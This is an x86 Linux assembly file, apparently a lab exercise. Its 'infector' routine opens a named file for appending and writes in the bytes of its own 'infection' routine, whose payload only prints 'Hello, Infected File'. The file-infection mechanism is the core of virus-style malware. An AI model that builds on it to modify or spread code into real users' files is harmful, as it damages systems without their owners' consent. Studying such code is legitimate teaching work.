section .data
    msg db  'Hello, Infected File',0xa 
    len equ $ - msg

section .text
global _start
global system_call
global infector
global infection
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state
    mov     eax, 4
    mov     ebx, 1
    mov     ecx, msg
    mov     edx, len
    int     0x80
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_end:
infector:
    push    ebp             
    mov     ebp, esp
    sub     esp, 4          ; save place to save the file discriptor
    pushad                  

    mov     eax, 5          ; open system call
    mov     ebx, [ebp+8]    ; [ebp+8] has the name of the file
    mov     ecx, 1026       ; open for write and append
    mov     edx, 0777       
    int     0x80
    mov     [ebp-4], eax    ; save the file discriptor
    cmp     eax, 0          ; if returned value < 0 then we got an error
    jl exit_with_error_0x55

    mov     eax, 4          ; write system call
    mov     ebx, [ebp-4]    ; file discriptor
    mov     ecx, code_start
    mov     edx, code_end
    sub     edx, code_start
    int     0x80

    mov     eax, 6          ; close system call
    mov     ebx, [ebp-4]    ; file discriptor
    mov     ecx, 0
    mov     edx, 0
    int     0x80

exit:
    popad
    add     esp, 4          
    pop     ebp             
    ret

exit_with_error_0x55:
    popad
    add     esp, 4          
    pop     ebp             
    mov     eax,1
    mov     ebx,0x55
    int     0x80
